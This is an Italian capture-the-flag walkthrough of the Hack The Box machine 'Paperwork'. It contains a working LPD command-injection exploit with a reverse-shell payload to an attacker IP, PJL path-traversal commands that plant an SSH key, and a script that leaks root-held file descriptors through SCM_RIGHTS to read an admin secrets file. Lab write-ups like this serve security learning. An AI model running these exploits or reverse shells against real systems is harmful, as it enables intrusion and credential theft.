### Write up Paperwork on thb.###
```bash
        nmap -sCV -p22,80,1515 -oN target 10.129.114.139
```
# results:
        `Nmap scan report for 10.129.114.139`

Host is up (0.079s latency).

PORT     STATE SERVICE        VERSION
+ 22/tcp   open  ssh            OpenSSH 10.0p2 Ubuntu 5ubuntu5.4 (Ubuntu Linux; protocol 2.0)
+ 80/tcp   open  http           nginx 1.28.0 (Ubuntu)
|_http-server-header: nginx/1.28.0 (Ubuntu)
|_http-title: Did not follow redirect to http://paperwork.htb/
+ 1515/tcp open  ifor-protocol?
| fingerprint-strings:
|   TerminalServer, TerminalServerCookie:
|_    Archive_Printer is ready and printing.
+ 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+ SF-Port1515-TCP:V=7.99%I=7%D=8/30%Time=6A936575%P=x86_64-pc-linux-gnu%r(Te
+ SF:rminalServerCookie,27,"Archive_Printer\x20is\x20ready\x20and\x20printin
+ SF:g\.\n")%r(TerminalServer,27,"Archive_Printer\x20is\x20ready\x20and\x20p
+ SF:rinting\.\n");
+ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

>***Fase 2 
### Exploitation paperwork
ispezionando il codice dell'archivio scaricato `paperwork-archive-v1.02` o scoperto che soffre di una vulnerabilità Command Injection cosi mi sono scritto un `exloit.py` 

```bash

\#!/usr/bin/env python3

import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("IP_RHOST", RPORT))

\# 1. Invia la richiesta della coda (Risposta attesa: b'\x00')
s.send(b'\x02' + b'archive_intake\n')
print("Risposta Coda:", s.recv(1024))

\# 2. Definiamo il payload preciso inserito dentro la struttura J (Job)
\# Cambia l'IP con quello della tua VPN tun0
payload = "bash -c 'bash -i >& /dev/tcp/10.10.XX.XX/4444 0>&1'"
control_file = f"H kali\nP root\nJ x'; {payload} ; echo '\n"
cf_bytes = control_file.encode()

\# 3. Comunica la dimensione esatta del file (Risposta attesa: b'\x00')
s.send(b'\x02' + f"{len(cf_bytes)} cfA001kali\n".encode())
print("Risposta Intestazione:", s.recv(1024))

\# 4. Invia il file di controllo che attiva l'iniezione
s.send(cf_bytes)
s.send(b'\x00') # Byte finale di chiusura sessione

\# 5. Leggi l'esito finale
print("Risposta Finale:", s.recv(1024))
s.close()```

```bash
	nc -lvnp 4444
	
	lp@paperwork:/opt/LPDServer$ whoami
	
	lp 
```
#lateral moviment
+ ispezionando il systema `which nc`,mi sono accorto che non era installato di defaul il che la cosa mi e parsa strana, allora o scaricato un ncat statico su (https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/ncat)
+ dopo aver inspezionato la porta interna >*127.0.0.1:9100 con `./ncat 127.0.0.1 9100 ` o trovato un servizio che mi a permesso di eseguire un comando;

```bash
	printf "\x1b%%-12345X@PJL FSUPLOAD NAME=\"jetdirect.py\"\n\x1b%%-12345X\n" | ./ncat 127.0.0.1 9100
```
```result 
jetdirect.py
@PJL FSUPLOAD NAME="jetdirect.py" SIZE=5119

\#!/usr/bin/env python3

import os
import sys
import socket
import logging
import re
import hashlib

class PJLServer:
    def __init__(self):
        self._server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def listen(self, port=9100, backlog=100):
        self._server.bind(("127.0.0.1", port))
        self._server.listen(backlog)
        logging.info("Listening on port %d" % port)

    def accept(self):
        client, addr = self._server.accept()
        logging.info("[%s] connected" % addr[0])
        return PJLClient(client, addr[0])

class PJLClient:
    def __init__(self, client, address):
        self._client = client
        self._address = address

    def get_line(self):
        """Reads until a newline to get a single PJL command."""
        line = b""
        while True:
            char = self._client.recv(1)
            if not char: return None
            line += char
            if char == b"\n": break
        return line

    def reply(self, message):
        if isinstance(message, str):
            message = message.encode("utf-8")
        self._client.sendall(message)

    def close(self):
        self._client.close()

class Filesystem:
    def __init__(self, root_dir):
        self._root = os.path.abspath(root_dir)

    def _translate(self, path):
        clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
        return os.path.normpath(os.path.join(self._root, clean))

    def listdir(self, name=""):
        target = self._translate(name)
        if not os.path.exists(target): return "FILEERROR=1"
        try:
            items = os.listdir(target)
            res = [". TYPE=DIR", ".. TYPE=DIR"]
            for i in items:
                p = os.path.join(target, i)
                res.append(f"{i} TYPE={'DIR' if os.path.isdir(p) else 'FILE'} SIZE={os.path.getsize(p)}")
            return "\n".join(res)
        except: return "FILEERROR=1"

    def read(self, path):
        target = self._translate(path)
        if os.path.isfile(target):
            with open(target, "rb") as f: return f.read()
        return None

    def write(self, path, data):
        target = self._translate(path)
        try:
            os.makedirs(os.path.dirname(target), exist_ok=True)
            with open(target, "wb") as f: f.write(data)
            return "OK"
        except: return "FILEERROR=1"

fs = None

def handle_download(command, client):
    m = re.search(r'NAME\s*=\s*"([^"]+)"\s*SIZE\s*=\s*(\d+)', command, re.I)
    if not m: return "FILEERROR=1"
    path, size = m.group(1), int(m.group(2))
    
    logging.info(f"Receiving file: {path} ({size} bytes)")
    data = b""
    while len(data) < size:
        chunk = client._client.recv(min(size - len(data), 4096))
        if not chunk: break
        data += chunk
    return fs.write(path, data)

def handle_upload(command):
    m = re.search(r'NAME\s*=\s*"([^"]+)"', command, re.I)
    if not m: return "FILEERROR=1"
    path = m.group(1)
    data = fs.read(path)
    if data is None: return "FILEERROR=1"
    header = f'@PJL FSUPLOAD NAME="{path}" SIZE={len(data)}\n'.encode("utf-8")
    return header + data

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <PORT> <ROOT_DIR>")
        sys.exit(1)

    fs = Filesystem(sys.argv[2])
    LOG_FILE = "/home/archivist/printer/logs/commands.log"
    logging.basicConfig(
        level=logging.INFO,
        format="%(message)s",
        handlers=[
            logging.FileHandler(LOG_FILE),
            logging.StreamHandler(sys.stdout)
        ]
    )
    server = PJLServer()
    server.listen(int(sys.argv[1]))

    while True:
        client = server.accept()
        while True:
            line_bytes = client.get_line()
            if not line_bytes: break
            
            # Filter protocol noise
            if b"@" not in line_bytes: continue
            line = line_bytes[line_bytes.find(b"@"):].decode("utf-8", errors="ignore").strip()
            
            if not line.startswith("@PJL"): continue
            logging.info(f"Command: {line}")

            if "FSDOWNLOAD" in line.upper():
                res = handle_download(line, client)
                client.reply(res + "\r\n")
            elif "FSUPLOAD" in line.upper():
                res = handle_upload(line)
                client.reply(res)
            elif "FSDIRLIST" in line.upper() or "FSQUERY" in line.upper():
                m = re.search(r'NAME\s*=\s*"([^"]+)"', line, re.I)
                res = fs.listdir(m.group(1) if m else "0:/")
                client.reply(res + "\r\n")
            elif "INFO ID" in line.upper():
                client.reply("HP LASERJET 4ML\r\n")
            elif "INFO FILESYS" in line.upper():
                client.reply("VOLUME TOTAL SIZE FREE SPACE LOCATION LABEL STATUS\n0:     1755136    1718272    <HT>     <HT>  READ-WRITE\r\n")
            elif "ECHO" in line.upper():
                client.reply(line + "\r\n")
            else:
                client.reply("OK\r\n")
        client.close()
```
###
### moviment lateral user archivist
dopo l'ispezione del codice trovato o notato che vi era una possibile `comand injection`
allora o preparato delle chiavi `ssh`;

```bash
	ssh-keygen -t rsa -f /tmp/id_rsa (dalla mia kali)
	
	python3 -m http.server 8000
	
	curl -L http://IP_Attacker -o id_rsa.pub #(dalla macchina vittima)
	
	(printf "\x1b%%-12345X@PJL FSDOWNLOAD NAME=\"../.ssh/authorized_keys\" SIZE=568\n" echo "INCOLLA LA_TUA_CHIAVE_PUBBLICA_QUI" printf "\x1b%%-12345X\n" ) \ 
        | ./ncat 127.0.0.1 9100
	
```
#connessione alla macchina victima tramite ssh ed il file creato:
dopo aver generato e trasferito la chiave pubblica `id_rsa.pub` nella macchina vittima con il seguente comando;

```bash
	cat id_rsa.pub | xclip -sel clip (apt install xclip, se non e nel vostro systema)
	
	
	ssh-keygen -t rsa -f /tmp/id_rsa -N "" (da kali)
	
	ssh -i id.rsa archivist@10.129.114.139 (da kali)
```
# Privilege escaation
## La scoperta del "Ponte" (Il Socket Unix)
Esaminando il sistema, abbiamo trovato il file /etc/paperwork/admin_pins.conf. Sapevamo che conteneva il segreto per diventare root, 
ma provando a leggerlo ricevevamo un errore di permessi (Permission denied), perché quel file è leggibile solo dall'utente root.
Facendo una scansione delle connessioni interne, abbiamo scoperto un Socket Unix attivo: /run/paperwork/mgmt.sock.
I permessi di questo file speciale dicevano che il tuo utente (archivist) aveva il diritto di parlarci. Interrogandolo, il socket rispondeva con:

* STATUS: SYSTEM_CLEAN
* SIGNATURE: <un hash SHA-256>

#La vulnerabilità: File Descriptor Leakage (SCM_RIGHTS)
Guardando dentro la funzione trigger_lockdown(conn) del codice di root, abbiamo trovato la falla di sicurezza macroscopica:

+ evidence_bundle = array.array("i", [log_fd, admin_fd])
+ conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])

Per motivi di diagnostica, gli sviluppatori hanno deciso che, in caso di attacco, 
il server deve inviare al socket i "file descriptor" (le prove) dell'incidente. 
Ma per errore hanno incluso nel pacchetto `binario (SCM_RIGHTS) sia il file di log, sia admin_fd` (cioè l'accesso diretto al file delle password!).

# Automazione Sincrona: 
Lo script fa tutto in memoria alla velocità del processore. 
Scrive la parola chiave esatta cercata dal `demone (FSUPLOAD)` nel file di log e,
un microsecondo dopo, apre la connessione verso il socket.

```python3 scripting escalation
\#!/usr/bin/env python3

import socket
import array
import os

LOG_PATH = "/home/archivist/printer/logs/commands.log"
SOCKET_PATH = "/run/paperwork/mgmt.sock"

\# 1. Inneschiamo l'allarme scrivendo ESATTAMENTE un trigger valido in maiuscolo
print("[*] Iniezione della stringa di allarme nel log...")
with open(LOG_PATH, "a") as f:
    f.write("Command: FSUPLOAD\n")

\# 2. Ci connettiamo immediatamente al socket Unix
print("[*] Connessione al socket per catturare il dump forense...")
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect(SOCKET_PATH)

\# Prepariamo i buffer per i dati accessori (SCM_RIGHTS)
buffer_size = 1024
ancillary_buffer_size = socket.CMSG_LEN(array.array('i').itemsize * 2)

\# Riceviamo il messaggio di violazione e i file descriptor passati da Root
msg, ancdata, flags, addr = s.recvmsg(buffer_size, ancillary_buffer_size)

print("\n[*] Risposta dal server:")
print(msg.decode(errors="ignore"))

\# Estraiamo i File Descriptor (i numeri dei canali aperti dal kernel)
fds = []
for cmsg_level, cmsg_type, cmsg_data in ancdata:
    if cmsg_level == socket.SOL_SOCKET and cmsg_type == socket.SCM_RIGHTS:
        fds.extend(array.array('i', cmsg_data[:len(cmsg_data) - len(cmsg_data) % array.array('i').itemsize]))

if fds:
    print(f"[+] Ricevuti {len(fds)} File Descriptor legali!")
    # Leggiamo il contenuto associato ai file descriptor ereditati da Root
    for fd in fds:
        try:
            with os.fdopen(fd, 'r') as f:
                content = f.read()
                if content:
                    print(f"\n[+] CONTENUTO RILEVATO NEL FILE DESCRIPTOR (FD {fd}):")
                    print(content)
        except Exception as e:
            pass
else:
    print("[-] Errore: Nessun File Descriptor ricevuto. Il log potrebbe essersi azzerato, riprova.")

s.close()
```

```bash
	su $passwd
	
	whoami 
	root
```
# macchina paperwork HTB
